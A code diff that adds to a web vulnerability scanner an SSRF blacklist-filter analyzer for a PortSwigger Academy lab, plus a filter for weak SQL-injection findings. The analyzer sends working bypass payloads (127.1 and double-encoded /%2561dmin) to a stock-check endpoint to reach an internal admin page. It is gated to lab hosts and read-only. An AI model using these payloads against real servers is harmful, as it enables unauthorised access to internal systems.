@@ -12124,3 +12124,298 @@ def run_portswigger_coverage_analyzer(target_url, html, active_raw=None):
 
 # Final report remains findings-only. Keep the new discovery details in raw
 # diagnostics for engineering review, not as a catalogue in the customer PDF.
+
+
+# ============================================================================
+# SATRIA SSRF BLACKLIST-FILTER LAB ANALYZER (separate from open-redirect lab)
+# This targets the distinct Academy workflow:
+#   POST /product/stock stockApi=...
+# and tests the documented loopback-alias + path-encoding filter behavior.
+# It is Academy-host-only, authorization-gated, same-origin at the HTTP client,
+# bounded to four POSTs, and reads /admin only. It NEVER calls /admin/delete.
+# ============================================================================
+SATRIA_SSRF_BLACKLIST_FILTER_V1 = True
+SATRIA_SSRF_BLACKLIST_MAX_REQUESTS = 4
+SATRIA_SSRF_BLACKLIST_TIMEOUT = 8
+SATRIA_SSRF_BLACKLIST_LAB_NAME = "SSRF with blacklist-based input filter"
+
+
+def _satria_ssrf_blacklist_stock_endpoint(target_url, crawler_forms, html):
+    """Return only a same-origin POST route whose form explicitly has stockApi."""
+    for form in (crawler_forms or []):
+        if not isinstance(form, dict):
+            continue
+        method = str(form.get("method") or "GET").lower()
+        fields = {str(x).lower() for x in (form.get("inputs") or [])}
+        action = urljoin(str(form.get("url") or target_url), str(form.get("action") or ""))
+        parsed = urlparse(action)
+        if (method == "post" and "stockapi" in fields
+                and parsed.path.rstrip("/").lower() == "/product/stock"
+                and _satria_ps_same_origin(action, target_url)):
+            return action
+    # The static fallback is restricted to the known Academy stock-check form.
+    source = str(html or "")[:PORTSWIGGER_EXTRA_BODY_LIMIT]
+    if (_satria_ps_is_lab(target_url)
+            and re.search(r"<form[^>]*action=[\"'][^\"']*/product/stock", source, re.I | re.S)
+            and re.search(r"name=[\"']stockApi[\"']", source, re.I)):
+        return urljoin(target_url, "/product/stock")
+    return ""
+
+
+def _satria_ssrf_blacklist_blocked(response):
+    body = _satria_ssrf_response_body(response, limit=80_000).lower()
+    status = int(getattr(response, "status_code", 0) or 0)
+    phrases = (
+        "external stock check blocked",
+        "stock check blocked for security reasons",
+        "blocked for security reasons",
+        "invalid stock api",
+        "invalid url",
+        "not allowed",
+        "access denied",
+    )
+    return status in {400, 401, 403, 406, 422} or any(x in body for x in phrases)
+
+
+def _satria_ssrf_blacklist_admin_markers(body):
+    text = str(body or "")[:180_000]
+    lower = text.lower()
+    heading = bool(re.search(r"<h[1-4][^>]*>[^<]*(?:admin(?:istration)? panel|admin interface|users)", text, re.I)
+                   or re.search(r"<title[^>]*>[^<]*admin", text, re.I))
+    carlos = bool(re.search(r"\bcarlos\b", lower))
+    delete_link = bool(re.search(r"/admin/delete(?:\?|['\" ])", text, re.I))
+    user_context = bool(re.search(r"\busers?\b", lower))
+    return {
+        "admin_heading": heading,
+        "carlos_user_marker": carlos,
+        "admin_delete_link_present": delete_link,
+        "user_context": user_context,
+        "strong_admin_page_signal": bool((heading and (carlos or delete_link or user_context)) or (carlos and delete_link)),
+    }
+
+
+def run_ssrf_blacklist_filter_analyzer(target_url, crawler_forms=None, html=""):
+    """Safely identify the Academy blacklist-filter bypass without deleting users.
+
+    The four payloads are confined to the Academy stockApi endpoint. They check:
+      1) canonical 127.0.0.1 is blocked,
+      2) alternate loopback 127.1 is accepted,
+      3) raw /admin is blocked,
+      4) double-encoded /admin returns the read-only admin interface.
+    Only response metadata/boolean markers are retained; response bodies are not.
+    """
+    out = {
+        "enabled": bool(SATRIA_SSRF_BLACKLIST_FILTER_V1),
+        "status": "NOT_ASSESSED",
+        "requests_sent": 0,
+        "stock_endpoint": "",
+        "probe_results": [],
+        "finding": None,
+        "notes": [],
+    }
+    if not _satria_ps_is_lab(target_url):
+        out["status"] = "SKIPPED_NON_ACADEMY_TARGET"
+        return out
+    if not RUN_PORTSWIGGER_COVERAGE or not active_probe_enabled():
+        out["status"] = "SKIPPED_AUTHORIZATION_REQUIRED"
+        out["notes"].append("Probe blacklist SSRF memerlukan gerbang otorisasi active scan.")
+        return out
+
+    stock_endpoint = _satria_ssrf_blacklist_stock_endpoint(target_url, crawler_forms, html)
+    if not stock_endpoint:
+        out["status"] = "STOCK_API_POST_FORM_NOT_DISCOVERED"
+        out["notes"].append("Tidak ditemukan form POST same-origin /product/stock dengan field stockApi; analyzer tidak menebak endpoint lain.")
+        return out
+    out["stock_endpoint"] = stock_endpoint
+
+    # Order matters: the first and third cases are filter controls; the second
+    # and fourth cases test the corresponding normalization bypasses.
+    probes = [
+        ("canonical_loopback_control", "http://127.0.0.1/"),
+        ("alternate_loopback_127_1", "http://127.1/"),
+        ("raw_admin_path_control", "http://127.1/admin"),
+        ("double_encoded_admin_path", "http://127.1/%2561dmin"),
+    ]
+    observations = {}
+    for probe_id, stock_api in probes[:SATRIA_SSRF_BLACKLIST_MAX_REQUESTS]:
+        try:
+            response = _satria_ctx_request(
+                stock_endpoint,
+                method="POST",
+                data={"stockApi": stock_api},
+                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded", "Referer": target_url},
+                timeout=SATRIA_SSRF_BLACKLIST_TIMEOUT,
+                allow_redirects=False,
+            )
+            out["requests_sent"] += 1
+            body = _satria_ssrf_response_body(response, limit=180_000)
+            blocked = _satria_ssrf_blacklist_blocked(response)
+            admin_markers = _satria_ssrf_blacklist_admin_markers(body) if probe_id == "double_encoded_admin_path" else {}
+            row = {
+                "probe": probe_id,
+                "http_status": int(getattr(response, "status_code", 0) or 0),
+                "blocked_by_filter": bool(blocked),
+                "response_bytes": len(body),
+                "admin_markers": admin_markers,
+            }
+            observations[probe_id] = row
+            out["probe_results"].append(row)
+        except Exception as exc:
+            row = {"probe": probe_id, "error": str(exc)[:180]}
+            observations[probe_id] = row
+            out["probe_results"].append(row)
+
+    canonical = observations.get("canonical_loopback_control", {})
+    alias = observations.get("alternate_loopback_127_1", {})
+    raw_admin = observations.get("raw_admin_path_control", {})
+    encoded_admin = observations.get("double_encoded_admin_path", {})
+    alias_accepted = bool(alias and not alias.get("blocked_by_filter") and alias.get("http_status", 0) < 500)
+    encoded_markers = encoded_admin.get("admin_markers") or {}
+    admin_reached = bool(encoded_markers.get("strong_admin_page_signal"))
+    direct_loopback_blocked = bool(canonical.get("blocked_by_filter"))
+    raw_admin_blocked = bool(raw_admin.get("blocked_by_filter"))
+
+    out["differential"] = {
+        "canonical_loopback_blocked": direct_loopback_blocked,
+        "alternate_loopback_accepted": alias_accepted,
+        "raw_admin_path_blocked": raw_admin_blocked,
+        "double_encoded_admin_reached": admin_reached,
+    }
+    if direct_loopback_blocked and alias_accepted and raw_admin_blocked and admin_reached:
+        out["status"] = "SSRF_BLACKLIST_AND_PATH_FILTER_BYPASS_CANDIDATE"
+        out["finding"] = {
+            "type": "SSRF with blacklist-based input filter — loopback and path filter bypass",
+            "severity": "high",
+            "cwe": "CWE-918",
+            "owasp": "A10:2021 - Server-Side Request Forgery",
+            "verification": "candidate_ssrf_blacklist_loopback_double_encoding",
+            "evidence": (
+                "Pada POST %s: canonical 127.0.0.1 diblokir; 127.1 tidak diblokir; "
+                "path /admin mentah diblokir; dan path double-encoded menghasilkan indikator halaman admin "
+                "(%s). Pemeriksaan berhenti pada pembacaan halaman; endpoint delete tidak dipanggil."
+                % (urlparse(stock_endpoint).path, json.dumps(encoded_markers, ensure_ascii=False))
+            ),
+            "risk": "Stock checker server-side tampak dapat diarahkan ke loopback internal dan filter path dapat dilewati melalui double URL encoding.",
+            "recommendation": "Gunakan allowlist host/protokol yang ketat setelah canonicalization; normalisasikan URL satu kali secara konsisten; validasi setiap redirect dan blokir seluruh alamat loopback/private setelah DNS resolution.",
+        }
+    elif alias_accepted and direct_loopback_blocked:
+        out["status"] = "SSRF_LOOPBACK_ALIAS_BYPASS_CANDIDATE"
+        out["notes"].append("127.1 diterima sedangkan 127.0.0.1 diblokir; akses admin belum dibuktikan.")
+        out["finding"] = {
+            "type": "SSRF blacklist filter — alternate loopback representation accepted",
+            "severity": "medium", "cwe": "CWE-918", "owasp": "A10:2021 - Server-Side Request Forgery",
+            "verification": "candidate_ssrf_loopback_alias",
+            "evidence": "Stock checker membedakan canonical 127.0.0.1 yang diblokir dari 127.1 yang diterima. Internal resource access belum dibuktikan.",
+            "risk": "Validasi blacklist mungkin bergantung pada representasi teks IP dan tidak melakukan canonicalization.",
+            "recommendation": "Parse dan canonicalize alamat IP sebelum validasi; blokir seluruh rentang loopback/private, bukan string literal tertentu.",
+        }
+    elif out["requests_sent"]:
+        out["status"] = "BLACKLIST_FILTER_PROBES_COMPLETED_NO_BYPASS_PROVEN"
+        out["notes"].append("Probe stockApi berjalan, tetapi differential filter dan indikator halaman admin belum memenuhi kriteria kandidat SSRF.")
+    else:
+        out["status"] = "BLACKLIST_FILTER_PROBE_FAILED"
+    return out
+
+
+# Suppress weak UNION-NULL-only noise. A non-error response to UNION SELECT NULL
+# with one column is not enough to report SQL injection, particularly on unrelated
+# Academy labs. Keep it in diagnostics, and report only corroborated SQLi signals.
+_SATRIA_SQLI_BEFORE_WEAK_UNION_FILTER = run_sql_injection_analyzer
+
+def run_sql_injection_analyzer(target_url, crawled_urls=None, crawled_forms=None):
+    result = _SATRIA_SQLI_BEFORE_WEAK_UNION_FILTER(
+        target_url, crawled_urls=crawled_urls, crawled_forms=crawled_forms
+    )
+    if not isinstance(result, dict):
+        return result
+    raw = result.get("raw") if isinstance(result.get("raw"), dict) else {}
+    findings = list(result.get("findings") or [])
+    weak = [x for x in findings if x.get("verification") == "candidate_sqli_union_null_shape"]
+    if weak:
+        result["findings"] = [x for x in findings if x.get("verification") != "candidate_sqli_union_null_shape"]
+        raw.setdefault("low_confidence_observations", []).extend([
+            {"type": x.get("type"), "evidence": x.get("evidence"),
+             "status": "NOT_REPORTED_NULL_ONLY_SHAPE_INSUFFICIENT"}
+            for x in weak
+        ])
+        for check in raw.get("checks", []) or []:
+            if check.get("name") == "SQL injection UNION attack, determining the number of columns returned by the query":
+                check["status"] = "NULL_ONLY_SHAPE_OBSERVATION_NOT_A_FINDING"
+                check["limitation"] = "Respons non-error saja tidak membuktikan UNION SQLi; perlu bukti kolom marker terpantul, error SQL baru, atau differential Boolean yang berulang."
+    raw["finding_candidates_total"] = len(result.get("findings") or [])
+    result["raw"] = raw
+    return result
+
+
+# Final active-scan wrapper: run the blacklist-filter analyzer in addition to the
+# separate open-redirect chain analyzer. Keep a per-scan context for its POSTs.
+_SATRIA_BLACKLIST_BASE_ACTIVE_SCAN = run_active_scanning
+
+def run_active_scanning(target_url, html):
+    session = requests.Session()
+    session.headers.update(HEADERS)
+    session.max_redirects = 5
+    cookie_header = str(os.getenv("SATRIA_PORTSWIGGER_SESSION_COOKIE", "") or "").strip()
+    if cookie_header and _satria_ps_is_lab(target_url):
+        session.headers.update({"Cookie": cookie_header})
+    context = {"session": session, "target": target_url, "request_ledger": []}
+    token = _SATRIA_SCAN_CONTEXT.set(context)
+    try:
+        result = _SATRIA_BLACKLIST_BASE_ACTIVE_SCAN(target_url, html)
+        if not isinstance(result, dict):
+            result = {"findings": [], "raw": {}, "skipped": False}
+        raw = result.setdefault("raw", {})
+        if result.get("skipped") or raw.get("skipped") or not active_probe_enabled():
+            raw["ssrf_blacklist_filter"] = {
+                "enabled": bool(SATRIA_SSRF_BLACKLIST_FILTER_V1),
+                "status": "SKIPPED_AUTHORIZATION_REQUIRED", "requests_sent": 0,
+                "notes": ["Tidak ada POST stockApi tanpa otorisasi active scan."],
+            }
+            return result
+        try:
+            crawl = raw.get("crawler") or {}
+            ssrf_result = run_ssrf_blacklist_filter_analyzer(
+                target_url, crawler_forms=crawl.get("forms", []), html=html
+            )
+            raw["ssrf_blacklist_filter"] = ssrf_result
+            coverage_raw = raw.get("portswigger_coverage") or {}
+            coverage_raw.setdefault("safe_checks", {})["ssrf_blacklist_filter"] = ssrf_result
+            summary = coverage_raw.setdefault("summary", {})
+            labels = summary.setdefault("safe_probe_families", [])
+            label = "SSRF blacklist filter: bounded stockApi loopback/path differential (Academy only)"
+            if ssrf_result.get("requests_sent") and label not in labels:
+                labels.append(label)
+            finding = ssrf_result.get("finding")
+            if finding:
+                result.setdefault("findings", []).append(finding)
+            for category in coverage_raw.get("categories", []) or []:
+                if category.get("name") == "Server-side request forgery (SSRF)":
+                    for check in category.get("checks", []) or []:
+                        if check.get("name") == SATRIA_SSRF_BLACKLIST_LAB_NAME:
+                            check["status"] = ssrf_result.get("status", "NOT_ASSESSED")
+                            check["evidence"] = json.dumps(ssrf_result.get("differential", {}), ensure_ascii=False)[:650]
+                            check["limitation"] = (
+                                "Hanya membaca hasil stock checker/admin page; tidak menjalankan /admin/delete. "
+                                "Status candidate membutuhkan validasi manual dan bukan klaim lab solved."
+                            )
+                    counts = {}
+                    for check in category.get("checks", []) or []:
+                        key = str(check.get("status") or "UNKNOWN")
+                        counts[key] = counts.get(key, 0) + 1
+                    category["status_counts"] = counts
+            raw.setdefault("discovery_v3", {}).setdefault("session_requests_tracked_after_modules", len(context.get("request_ledger", [])))
+            print("      [SSRF Blacklist] status=%s; requests=%s; finding=%s" % (
+                ssrf_result.get("status"), ssrf_result.get("requests_sent", 0), bool(finding)
+            ))
+        except Exception as exc:
+            raw["ssrf_blacklist_filter"] = {"enabled": True, "status": "ERROR",
+                "requests_sent": 0, "notes": [str(exc)[:240]]}
+            print("      [SSRF Blacklist] Analyzer gagal: %s" % str(exc)[:180])
+        return result
+    finally:
+        try:
+            session.close()
+        finally:
+            _SATRIA_SCAN_CONTEXT.reset(token)
+
+SATRIA_SSRF_BLACKLIST_PATCH_V1 = True
